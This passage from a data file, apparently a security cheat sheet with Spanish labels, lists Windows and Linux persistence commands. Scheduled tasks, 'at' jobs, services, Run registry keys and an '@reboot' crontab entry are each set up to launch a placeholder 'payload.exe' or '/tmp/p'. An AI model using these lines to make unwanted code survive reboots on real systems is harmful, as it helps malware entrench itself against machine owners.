    "desc": "Win task"
   },
   {
    "cmd": "schtasks /create /tn x /tr payload.exe /sc once /st 09:00",
    "desc": "Una vez"
   },
   {
    "cmd": "schtasks /run /tn x",
    "desc": "Ejecutar"
   },
   {
    "cmd": "schtasks /query /fo LIST | head",
    "desc": "Listar"
   },
   {
    "cmd": "schtasks /delete /tn x /f",
    "desc": "Borrar"
   },
   {
    "cmd": "at 09:00 /interactive cmd /c payload.exe",
    "desc": "At win"
   },
   {
    "cmd": "sc create x binPath= C:\\\\payload.exe",
    "desc": "Servicio"
   },
   {
    "cmd": "sc start x",
    "desc": "Iniciar servicio"
   },
   {
    "cmd": "sc config x start= auto",
    "desc": "Auto start"
   },
   {
    "cmd": "sc delete x",
    "desc": "Borrar servicio"
   },
   {
    "cmd": "reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v x /t REG_SZ /d 'C:\\\\payload.exe'",
    "desc": "Run key"
   },
   {
    "cmd": "reg add HKCU\\\\...\\\\Run /v x /d 'payload.exe'",
    "desc": "HKCU Run"
   },
   {
    "cmd": "reg query HKLM\\\\...\\\\Run",
    "desc": "Ver Run keys"
   },
   {
    "cmd": "systemctl enable --now servicio",
    "desc": "Linux enable"
   },
   {
    "cmd": "crontab -e",
    "desc": "Crontab"
   },
   {
    "cmd": "echo '@reboot /tmp/p' | crontab -",
    "desc": "Reboot cron"
   }
  ]
 }
];
